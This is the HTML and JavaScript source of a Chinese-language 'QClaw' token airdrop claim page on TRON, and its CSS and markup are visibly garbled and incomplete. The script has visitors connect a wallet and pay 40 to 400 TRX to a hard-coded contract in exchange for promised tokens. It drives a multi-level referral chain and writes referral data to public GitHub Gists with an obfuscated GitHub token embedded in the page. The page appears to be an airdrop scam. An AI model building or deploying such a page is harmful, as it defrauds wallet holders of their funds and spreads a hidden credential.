<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>QClaw · 空投申领</title>
    <link rel="preconnect" href="https://cdn.jsdelivr.net">
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🎁</text></svg>">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0d0d1a;
            color: #eee;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
        }
        body::before {
            content: '';
            position: fixed;
            top: -60%; left: -20%;
            width: 140%; height: 80%;
            background: radial-gradient(ellipse at 50% -20%, rgba(107,79,216,0.14) 0%, transparent 65%);
            pointer-events: none;
            z-index: 0;
        }
        .card {
            position: relative; z-index: 1;
            background: #13132b;
            border: 1px solid rgba(107,79,216,0.22);
            border-radius: 20px;
            padding: 26px 22px;
            width: 100%; max-width: 440px;
            box-shadow: 0 24px 64px rgba(0,0,0,0.5);
            overflow: hidden;
        }
        .card::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0; height: 2px;
            background: linear-gradient(90deg, transparent, #e94560 30%, #6b4fd8 70%, transparent);
        }
        .card h1 {
            font-size: 22px; text-align: center; margin-bottom: 2px;
            background: linear-gradient(135deg, #e94560, #6b4fd8);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        }
        .subtitle {
            text-align: center; color: #444; font-size: 11px;
            margin-bottom: 18px; letter-spacing: 3px; text-transform: uppercase;
        }
        .wallet-bar {
            display: flex; align-items: center; gap: 8px;
            background: #0d0d20; border: 1px solid #1e1e3a;
            border-radius: 10px; padding: 10px 14px; margin-bottom: 12px;
            font-size: 12px; min-height: 40px;
        }
        .wallet-dot {
            width: 8px; height: 8px; border-radius: 50%;
            background: #333; flex-shrink: 0;
            transition: background 0.3s, box-shadow 0.3s;
        }
        .wallet-dot.ok  { background: #4ade80; box-shadow: 0 0 6px #4ade80; }
        .wallet-dot.err  { background: #f87171; }
        .wallet-dot.loading { background: #facc15; animation: blink 1.2s ease-in-out infinite; }
        @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.3} }
        .wallet-addr { color: #666; transition: color 0.3s; }
        .wallet-addr.ok { color: #4cc9f0; font-family: monospace; font-size: 11px; }
        .referrer-banner {
            background: linear-gradient(135deg, #1c0d3a, #2d1b69);
            border: 1px solid rgba(107,79,216,0.5);
            border-radius: 10px; padding: 10px 14px; margin-bottom: 12px;
            font-size: 13px; color: #c4b5fd; text-align: center;
            display: none; align-items: center; justify-content: center; gap: 8px;
            animation: slideIn 0.25s ease-out;
        }
        .referrer-banner.show { display: flex; }
        .referrer-banner .close-btn {
            margin-left: auto; background: none; border: none;
            color: #6b4fd8; cursor: pointer; font-size: 16px; line-height: 1;
            padding: 0 2px; flex-shrink: 0;
        }
        @keyframes slideIn { from{opacity:0;transform:translateY(-6px)} to{opacity:1;transform:translateY(0)} }
        .info-grid {
            display: grid; grid-template-columns: 1fr 1fr;
            gap: 8px; margin-bottom: 14px;
        }
        .info-card {
            background: #0d0d20; border: 1px solid #1e1e3a;
            border-radius: 10px; padding: 10px 12px;
        }
        .info-card .label {
            color: #444; font-size: 10px; text-transform: uppercase;
            letter-spacing: 1px; margin-bottom: 4px;
        }
        .info-card .val { font-size: 13px; font-weight: 600; color: #4cc9f0; }
        .info-card .val.accent { color: #e94560; }
        .cd-bar {
            background: #0d0d20; border: 1px solid #1e1e3a;
            border-radius: 10px; padding: 10px 14px; margin-bottom: 14px;
            text-align: center; font-size: 12px; color: #444;
        }
        .cd-bar .time {

        .input-section { margin-bottom: 14px; }
        .input-section label {
            display: block; font-size: 11px; color: #444; margin-bottom: 7px;
        }
        .input-row {
            display: flex; align-items: center;
            background: #0d0d20; border: 1px solid #1e1e3a;
            border-radius: 12px; overflow: hidden; transition: border-color 0.2s;
        }
        .input-row:focus-within { border-color: #6b4fd8; }
        .input-row .unit {
            padding: 0 16px; font-size: 16px; color: #444;
            flex-shrink: 0;
        }
        .input-row input {
            flex: 1; background: transparent; border: none;
            padding: 14px 16px; font-size: 22px; color: #fff;
            outline: none; text-align: right; width: 0;
        }
        .input-row input:disabled { color: #444; }
        .preview {
            background: linear-gradient(135deg, rgba(107,79,216,0.12), rgba(233,69,96,0.08));

        .preview .amount span { font-size: 13px; color: #666; }
        .btn-main {
            width: 100%; padding: 15px;
            background: linear-gradient(135deg, #e94560, #b8274a);

        .btn-invite {

        .hint {
            text-align: center; color: #e94560; font-size: 11px;
            margin-bottom: 14px; display: none;
        }
        .status {
            margin-top: 10px; padding: 12px; border-radius: 10px;
            font-size: 12px; display: none; line-height: 1.6; word-break: break-all;
        }
        .status.ok  { background: rgba(74,222,128,0.1);  border: 1px solid rgba(74,222,128,0.2);  color: #4ade80; }

            border-top: 1px solid #1e1e3a;
            padding-top: 16px; margin-top: 16px;

        }
        .invite-section.show { display: block; }
        .invite-title {
            font-size: 12px; color: #6b4fd8; text-align: center;

        }
        .count-row { display: flex; gap: 10px; margin-bottom: 14px; }
        .count-box {
            flex: 1;
            background: linear-gradient(160deg, rgba(107,79,216,0.14), rgba(107,79,216,0.04));
            border: 1px solid rgba(107,79,216,0.2);

            font-size: 10px; color: #444; text-transform: uppercase;

        }
        .link-box {
            background: #0d0d20; border: 1px solid #1e1e3a;

        }

        .link-row { display: flex; gap: 8px; }
        .link-row input {
            flex: 1; background: #0a0a1a; border: 1px solid #2a2a4a;
            border-radius: 8px; padding: 9px 12px; color: #7c6fcd;
            font-size: 11px; font-family: monospace; outline: none;
        }
        .btn-copy {
            padding: 9px 14px; background: #6b4fd8; color: #fff;

        }
        .btn-copy:hover { background: #5a3fc0; }
        .share-row { display: flex; gap: 8px; margin-bottom: 10px; }
        .share-btn {
            flex: 1; padding: 9px; border: none; border-radius: 8px;
            font-size: 12px; cursor: pointer; text-align: center; color: #fff;

        .share-btn:hover { opacity: 0.85; }
        .share-btn.tg { background: #2ca5e0; }
        .share-btn.tw { background: #1da1f2; }
        .btn-refresh {
            width: 100%; padding: 8px; background: #0d0d20;
            border: 1px solid #1e1e3a; border-radius: 8px;
            color: #444; font-size: 12px; cursor: pointer;
            margin-bottom: 10px; transition: color 0.15s, border-color 0.15s;
        }
        .btn-refresh:hover { color: #4cc9f0; border-color: rgba(76,201,240,0.4); }
        .diag-box {
            background: rgba(74,222,128,0.07);
            border: 1px solid rgba(74,222,128,0.18);
            border-radius: 8px; padding: 8px 12px;
            font-size: 12px; color: #4ade80; text-align: center;
            display: none; margin-top: 8px;
        }
        .diag-box.show { display: block; }
        .direct-list { margin-top: 8px; }
        .direct-list .direct-title {
            font-size: 10px; color: #444; text-transform: uppercase;
            letter-spacing: 1px; margin-bottom: 6px;
        }
        .direct-list .direct-item {
            background: #0d0d20; border: 1px solid #1e1e3a;
            border-radius: 8px; padding: 8px 12px;
            display: flex; justify-content: space-between; align-items: center;
            font-size: 12px; margin-bottom: 4px;
        }
        .direct-list .direct-addr { color: #4cc9f0; font-family: monospace; }
        .direct-list .direct-time { color: #555; font-size: 11px; }
        .retry-btn {
            margin-top: 8px; padding: 8px 16px;
            background: rgba(76,201,240,0.12);
            border: 1px solid rgba(76,201,240,0.3);
            border-radius: 8px; color: #4cc9f0;
            font-size: 12px; cursor: pointer; width: 100%;
            transition: background 0.15s;
        }
        .retry-btn:hover { background: rgba(76,201,240,0.22); }
    </style>
</head>
<body>
<div class="card">

    <div class="info-grid">
        <div class="info-card">
            <div class="label">基础汇率</div>

        </div>
        <div class="info-card">

    <div class="preview">
        <span class="label">预计获得</span>

    <button class="btn-main" id="buyBtn" disabled>连接钱包后领取</button>

        <div class="invite-title">— 我的邀请 —</div>

                <span class="num" id="refCount">0</span>
                <span class="desc">直接邀请</span>

            <div class="count-box">
                <span class="num" id="refCountAll">0</span>

        <div class="link-box">
            <label>邀请链接</label>
            <div class="link-row">
                <input type="text" id="refLinkInput" readonly />
                <button class="btn-copy" id="copyBtn" onclick="copyRefLink()">复制</button>
            </div>

        <div class="share-row">

            <button class="share-btn tw" onclick="shareTo('tw')">🐦 Twitter/X</button>
        </div>

        <button class="btn-refresh" id="refreshBtn" onclick="refreshInvite()">🔄 刷新数量</button>

        <div class="direct-list" id="directRefBox" style="display:none;">
            <div class="direct-title">直接邀请记录</div>
            <div id="directRefList"></div>

        <div class="diag-box" id="diagBox"></div>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
<script>
// ═══════════════════════════════════════════════
//  常量
// ═══════════════════════════════════════════════
const CONTRACT_HEX = '412ee69124a85ecee19772c71f2cc5614423e18fa5';
const RATE = 4, BONUS = 2;
const TRONGRID = 'https://api.trongrid.io';
const PAGE_URL  = 'https://qclaw-token-sale.github.io/qclaw/';
const END_DATE  = new Date('2026-08-17T00:00:00+08:00');

// ═══════════════════════════════════════════════
//  状态
// ═══════════════════════════════════════════════
let tronWeb = null, myAddr = null, currentRef = null;
let walletReady = false;

// ═══════════════════════════════════════════════
//  倒计时
// ═══════════════════════════════════════════════
(function countdown() {
    const diff = END_DATE - Date.now();
    const el   = document.getElementById('cdInline');
    if (!el) return;
    if (diff <= 0) { el.textContent = '已结束'; return; }
    const d = Math.floor(diff / 86400000);
    const h = Math.floor((diff % 86400000) / 3600000);
    const m = Math.floor((diff % 3600000) / 60000);
    const s = Math.floor((diff % 60000) / 1000);
    el.textContent = String(d).padStart(2,'0') + '天' + String(h).padStart(2,'0') + '时' + String(m).padStart(2,'0') + '分' + String(s).padStart(2,'0') + '秒';
})();
setInterval(() => {
    const diff = END_DATE - Date.now();
    const el   = document.getElementById('cdInline');
    if (!el) return;
    if (diff <= 0) { el.textContent = '已结束'; return; }
    const d = Math.floor(diff / 86400000);
    const h = Math.floor((diff % 86400000) / 3600000);
    const m = Math.floor((diff % 3600000) / 60000);
    const s = Math.floor((diff % 60000) / 1000);
    el.textContent = String(d).padStart(2,'0') + '天' + String(h).padStart(2,'0') + '时' + String(m).padStart(2,'0') + '分' + String(s).padStart(2,'0') + '秒';
}, 1000);

// ═══════════════════════════════════════════════
//  存储
// ═══════════════════════════════════════════════
const S = {
    claimed: addr => localStorage.getItem('qclaw_claimed_' + addr),
    setClaimed: addr => {
        localStorage.setItem('qclaw_claimed_addr', addr);
        localStorage.setItem('qclaw_claimed_' + addr, '1');
    }
};

// ═══════════════════════════════════════════════
//  GitHub Gist 邀请记录存储
// ═══════════════════════════════════════════════
const TOKEN_URL = 'https://qclaw-token-sale.github.io/qclaw/qclaw_gist_token.txt';
const GIST_API = 'https://api.github.com/gists';
let GIST_TOKEN = null;

// Token 双层混淆存储（base64 + 反转）
const TOKEN_ENCODED = 'UzNaeGRFb3pTSFpWU2tSb2RIWnBRelZOVWxOaVNXTXpWMlJIUW5wTk4xQk5SazA0WDNCb1p3PT0=';

async function loadGistToken() {
    if (GIST_TOKEN) return GIST_TOKEN;
    try {
        const res = await fetch(TOKEN_URL);
        if (res.ok) {
            GIST_TOKEN = (await res.text()).trim();
            return GIST_TOKEN;
        }
    } catch (e) {}
    try {
        const b64_1 = atob(TOKEN_ENCODED);
        const rev = atob(b64_1);
        GIST_TOKEN = rev.split('').reverse().join('');
        return GIST_TOKEN;
    } catch (e) {
        console.error('[QClaw] 加载token失败:', e);
        return null;
    }
}

function getReferrerGistId(refAddr) {
    return localStorage.getItem('qclaw_gist_' + refAddr);
}

function setReferrerGistId(refAddr, gistId) {
    localStorage.setItem('qclaw_gist_' + refAddr, gistId);
}

async function createReferrerGist(refAddr, newAddr) {
    const token = await loadGistToken();
    if (!token) return null;
    
    const now = new Date();
    const time = now.getFullYear() + '-' + String(now.getMonth()+1).padStart(2,'0') + '-' + String(now.getDate()).padStart(2,'0') + ' ' + String(now.getHours()).padStart(2,'0') + ':' + String(now.getMinutes()).padStart(2,'0');
    const record = { addr: newAddr, time, ref: refAddr };
    const content = JSON.stringify([record], null, 2);
    
    try {
        const res = await fetch(GIST_API, {
            method: 'POST',
            headers: { 'Authorization': `token ${token}`, 'Content-Type': 'application/json' },
            body: JSON.stringify({
                description: `QClaw邀请记录 - ${refAddr.slice(0,6)}...${refAddr.slice(-4)}`,
                public: true,
                files: { 'qclaw_referrals.json': { content } }
            })
        });
        const data = await res.json();
        if (data.id) {
            setReferrerGistId(refAddr, data.id);
            return data.id;
        }
    } catch (e) {
        console.error('[QClaw] 创建Gist失败:', e);
    }
    return null;
}

// ═══════════════════════════════════════════════
//  多层级邀请系统
// ═══════════════════════════════════════════════

// 存储每个人的上级邀请人（用于多层级追溯）
const RefTree = {
    get: addr => localStorage.getItem('qclaw_ref_tree_' + addr),
    set: (addr, referrer) => localStorage.setItem('qclaw_ref_tree_' + addr, referrer)
};

// 追加邀请记录（支持多层级）
async function appendReferrerGist(refAddr, newAddr) {
    // 1. 记录 newAddr 的上级邀请人
    RefTree.set(newAddr, refAddr);
    
    // 2. 追溯整个邀请链，给每个人都加分
    const credited = {};
    let currentReferrer = refAddr;
    
    while (currentReferrer && !credited[currentReferrer]) {
        credited[currentReferrer] = true;
        
        // 写入当前邀请人的 Gist
        await _appendToGist(currentReferrer, newAddr);
        
        // 向上追溯
        currentReferrer = RefTree.get(currentReferrer);
    }
    
    return true;
}

// 实际写入单个 Gist
async function _appendToGist(refAddr, newAddr) {
    let gistId = getReferrerGistId(refAddr);
    
    // 如果没有 Gist，创建新的
    if (!gistId) {
        gistId = await createReferrerGist(refAddr, newAddr);
        return !!gistId;
    }
    
    const token = await loadGistToken();
    if (!token) return false;
    
    try {
        const res = await fetch(`https://api.github.com/gists/${gistId}`);
        const data = await res.json();
        const content = data.files['qclaw_referrals.json']?.content || '[]';
        let records = JSON.parse(content);
        
        // 检查是否已存在
        if (records.some(r => r.addr === newAddr)) return true;
        
        // 追加新记录
        const now = new Date();
        const time = now.getFullYear() + '-' + String(now.getMonth()+1).padStart(2,'0') + '-' + String(now.getDate()).padStart(2,'0') + ' ' + String(now.getHours()).padStart(2,'0') + ':' + String(now.getMinutes()).padStart(2,'0');
        records.push({ addr: newAddr, time, ref: refAddr });
        
        // 更新 Gist
        const updateRes = await fetch(`https://api.github.com/gists/${gistId}`, {
            method: 'PATCH',
            headers: { 'Authorization': `token ${token}`, 'Content-Type': 'application/json' },
            body: JSON.stringify({ files: { 'qclaw_referrals.json': { content: JSON.stringify(records, null, 2) } } })
        });
        return updateRes.ok;
    } catch (e) {
        console.error('[QClaw] 更新Gist失败:', e);
    }
    return false;
}

async function fetchReferrerGist(refAddr) {
    const gistId = getReferrerGistId(refAddr);
    if (!gistId) return [];
    try {
        const res = await fetch(`https://api.github.com/gists/${gistId}`);
        const data = await res.json();
        const content = data.files['qclaw_referrals.json']?.content || '[]';
        return JSON.parse(content);
    } catch (e) {
        console.error('[QClaw] 读取Gist失败:', e);
    }
    return [];
}

// ═══════════════════════════════════════════════
//  UI 工具
// ═══════════════════════════════════════════════
function setWalletDot(cls, text) {
    const dot  = document.getElementById('walletDot');
    const addr = document.getElementById('walletAddr');
    if (!dot || !addr) return;
    dot.className  = 'wallet-dot ' + (cls || '');
    addr.textContent = text;
    addr.className  = 'wallet-addr' + (cls === 'ok' ? ' ok' : '');
}

function showStatus(type, html) {
    const el = document.getElementById('statusBox');
    if (!el) return;
    el.className = 'status ' + type;
    el.innerHTML = html;
    el.style.display = 'block';
}
function hideStatus() {
    const el = document.getElementById('statusBox');
    if (el) el.style.display = 'none';
}

function setBuyBtn(text, disabled) {
    const btn = document.getElementById('buyBtn');
    if (!btn) return;
    btn.textContent = text;
    btn.disabled = disabled;
}

function setClaimedUI() {
    setBuyBtn('已领取', true);
    document.getElementById('onceHint').style.display = 'block';
    document.getElementById('trxAmount').disabled = true;
    document.getElementById('referrerBanner').classList.remove('show');
    document.getElementById('inviteBtn').classList.add('show');
    document.getElementById('inviteSection').classList.add('show');
    refreshInvite();
    hideStatus();
}

function updatePreview() {
    const v = parseFloat(document.getElementById('trxAmount').value) || 0;
    const tokens = Math.floor(v * (RATE + BONUS));
    document.getElementById('tokenOut').textContent = walletReady ? tokens.toLocaleString() : '—';
    const claimed = myAddr && S.claimed(myAddr);
    if (!walletReady) {
        setBuyBtn('连接钱包后领取', true);
    } else if (claimed) {
        setBuyBtn('已领取', true);
    } else if (v <= 40 || v >= 400) {
        setBuyBtn(v > 0 && v < 40 ? '最低 40 TRX' : '最高 400 TRX', true);
    } else {
        setBuyBtn('获取空投', false);
    }
}

// ═══════════════════════════════════════════════
//  邀请
// ═══════════════════════════════════════════════
function refreshInvite() {
    if (!myAddr) return;
    fetchReferrerGist(myAddr).then(records => {
        // 直接邀请 = records 中 ref === myAddr 的记录
        const directRecords = records.filter(r => r.ref === myAddr);
        document.getElementById('refCount').textContent = directRecords.length;
        
        // 全部层级 = 所有记录
        document.getElementById('refCountAll').textContent = records.length;
        
        const box = document.getElementById('directRefBox');
        if (directRecords.length === 0) {
            box && (box.style.display = 'none');
        } else {
            box && (box.style.display = 'block');
            const list = document.getElementById('directRefList');
            if (list) {
                list.innerHTML = directRecords.map(r =>
                    `<div class="direct-item">
                        <span class="direct-addr">${r.addr.slice(0,6)}...${r.addr.slice(-4)}</span>
                        <span class="direct-time">${r.time}</span>
                    </div>`
                ).join('');
            }
        }
        
        const diag = document.getElementById('diagBox');
        if (diag) {
            diag.textContent = '✓ 已从云端刷新';
            diag.classList.add('show');
            clearTimeout(diag._t);
            diag._t = setTimeout(() => diag.classList.remove('show'), 2000);
        }
    }).catch(err => {
        console.error('[QClaw] 刷新失败:', err);
    });
}

function toggleInvite() {
    const sec = document.getElementById('inviteSection');
    sec && sec.classList.toggle('show');
    if (sec && sec.classList.contains('show')) refreshInvite();
}

function copyRefLink() {
    const v   = document.getElementById('refLinkInput').value;
    const btn = document.getElementById('copyBtn');
    if (navigator.clipboard) {
        navigator.clipboard.writeText(v).catch(() => {});
    } else {
        const ta = document.createElement('textarea');
        ta.value = v; document.body.appendChild(ta);
        ta.select(); document.execCommand('copy');
        document.body.removeChild(ta);
    }
    if (btn) { btn.textContent = '已复制!'; setTimeout(() => { if (btn) btn.textContent = '复制'; }, 2000); }
}

function shareTo(platform) {
    const link = encodeURIComponent(document.getElementById('refLinkInput').value || '');
    const text = encodeURIComponent('🎁 领取 QClaw 空投！使用我的邀请链接：' + link);
    if (platform === 'tg') window.open('https://t.me/share/url?url=' + link + '&text=' + text, '_blank');
    else window.open('https://twitter.com/intent/tweet?text=' + text, '_blank');
}

// ═══════════════════════════════════════════════
//  钱包连接
// ═══════════════════════════════════════════════
const W = { UNKNOWN: 0, TRYING: 1, OK: 2, ERR: 3 };
let walletState = W.UNKNOWN;

function probeWallet() {
    if (window.tronLink) {
        const tw = window.tronLink.tronWeb || window.tronWeb;
        if (tw) {
            const da = tw.defaultAddress;
            const addr = da && (da.base58 || (da.hex && da.hex.startsWith('41') ? tw.address.fromHex(da.hex) : null));
            if (addr && addr.length >= 34) return { tronWeb: tw, addr };
        }
    }
    if (window.tronWeb) {
        const da = window.tronWeb.defaultAddress;
        const addr = da && (da.base58 || (da.hex && da.hex.startsWith('41') ? window.tronWeb.address.fromHex(da.hex) : null));
        if (addr && addr.length >= 34) return { tronWeb: window.tronWeb, addr };
    }
    return null;
}

function tryConnectNow() {
    const r = probeWallet();
    if (!r) return false;
    myAddr = r.addr;
    walletReady = true;
    tronWeb = r.tronWeb;
    walletState = W.OK;
    const refInput = document.getElementById('refLinkInput');
    if (refInput) refInput.value = PAGE_URL + '?ref=' + encodeURIComponent(myAddr);
    setWalletDot('ok', myAddr);
    document.getElementById('trxAmount').disabled = false;
    if (S.claimed(myAddr)) {
        setClaimedUI();
    } else {
        updatePreview();
    }
    return true;
}

function startPolling() {
    if (walletState === W.OK || walletState === W.ERR) return;
    walletState = W.TRYING;
    (function poll() {
        if (walletState !== W.TRYING) return;
        const r = probeWallet();
        if (r) {
            myAddr = r.addr;
            walletReady = true;
            tronWeb = r.tronWeb;
            walletState = W.OK;
            const refInput = document.getElementById('refLinkInput');
            if (refInput) refInput.value = PAGE_URL + '?ref=' + encodeURIComponent(myAddr);
            setWalletDot('ok', myAddr);
            document.getElementById('trxAmount').disabled = false;
            if (S.claimed(myAddr)) {
                setClaimedUI();
            } else {
                updatePreview();
            }
            return;
        }
        setTimeout(poll, 400);
    })();
}

async function connectWallet() {
    if (tryConnectNow()) return;
    if (window.tronLink) {
        try {
            await window.tronLink.request({ method: 'tron_requestAccounts' });
        } catch (_) {}
        if (tryConnectNow()) return;
    }
    startPolling();
    updatePreview();
    setTimeout(() => {
        if (walletState !== W.OK) {
            walletState = W.ERR;
            const hint = (tronWeb && tronWeb.defaultAddress) ? JSON.stringify(tronWeb.defaultAddress) : '';
            setWalletDot('err', '连接超时');
            showStatus('err',
                '⚠️ 钱包连接超时，请确认：<br>' +
                '① 使用 TP 钱包 / TronLink 的 DApp 浏览器打开<br>' +
                '② 钱包已解锁并已授权此 DApp<br>' +
                (hint ? '<br>调试：' + hint : '') +
                '<br><button class="retry-btn" onclick="connectWallet()">🔄 重试连接</button>'
            );
        }
    }, 15000);
}

// ═══════════════════════════════════════════════
//  初始化
// ═══════════════════════════════════════════════
function init() {
    const params = new URLSearchParams(location.search);
    const ref = params.get('ref');
    if (ref && ref !== myAddr) {
        currentRef = ref;
        const banner = document.getElementById('referrerBanner');
        const refAddr = document.getElementById('referrerAddr');
        if (banner) {
            banner.classList.add('show');
            if (refAddr) refAddr.textContent = ref.slice(0,6) + '...' + ref.slice(-4);
        }
    }

    const closeBtn = document.getElementById('closeRefBanner');
    if (closeBtn) {
        closeBtn.addEventListener('click', () => {
            const banner = document.getElementById('referrerBanner');
            if (banner) banner.classList.remove('show');
        });
    }

    const trxInput = document.getElementById('trxAmount');
    if (trxInput) {
        trxInput.addEventListener('input', updatePreview);
    }

    connectWallet();

    setInterval(() => {
        if (myAddr) {
            const sec = document.getElementById('inviteSection');
            if (sec && sec.classList.contains('show')) refreshInvite();
        }
    }, 5000);
}

// ═══════════════════════════════════════════════
//  领取
// ═══════════════════════════════════════════════
async function buyTokens() {
    if (!walletReady || !tronWeb || !myAddr) {
        showStatus('err', '钱包未连接，请稍等或点击「重试连接」');
        return;
    }
    const amount = parseFloat(document.getElementById('trxAmount').value);
    if (!amount || amount <= 0) { showStatus('err', '请输入有效的 TRX 数量'); return; }
    if (amount <= 40 || amount >= 400) { showStatus('err', 'TRX 数量需在 40 ~ 400 之间'); return; }

    setBuyBtn('处理中...', true);
    hideStatus();
    showStatus('info', '请在钱包中确认并签名交易...');

    try {
        const sun = Math.floor(amount * 1e6);
        const tx  = await tronWeb.transactionBuilder.triggerSmartContract(
            CONTRACT_HEX, 'claimReward()',
            { callValue: sun, feeLimit: 1e8 },
            [], tronWeb.address.toHex(myAddr)
        );
        const signed = await tronWeb.trx.sign(tx.transaction);
        const result = await tronWeb.trx.sendRawTransaction(signed);

        if (result.result) {
            S.setClaimed(myAddr);
            const validRef = currentRef && currentRef !== myAddr ? currentRef : null;
            if (validRef) {
                appendReferrerGist(validRef, myAddr).then(success => {
                    console.log('[QClaw] 邀请记录写入Gist:', success ? '成功' : '失败');
                });
            }
            console.log('[QClaw] 领取成功，validRef:', validRef || '无');
            setClaimedUI();
            showStatus('ok',
                '🎉 申领成功！<br>' +
                'Tx: <a href="https://tronscan.org/#/transaction/' + result.txid + '" target="_blank" style="color:#4cc9f0;font-size:11px;">' + result.txid.slice(0,16) + '...</a><br>' +
                '<span style="font-size:12px;">✨ 快去邀请好友吧！</span>'
            );
        } else {
            setBuyBtn('获取空投', false);
            showStatus('err', '交易失败，请重试');
        }
    } catch (err) {
        setBuyBtn('获取空投', false);
        let msg = (err.message || String(err)).replace(/at async.*$/gm, '').replace(/\n/g, ' ').trim();
        showStatus('err', '错误：' + (msg.length > 180 ? msg.slice(0,180) + '...' : msg));
    }
}

document.getElementById('buyBtn').addEventListener('click', buyTokens);

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
} else {
    init();
}
</script>
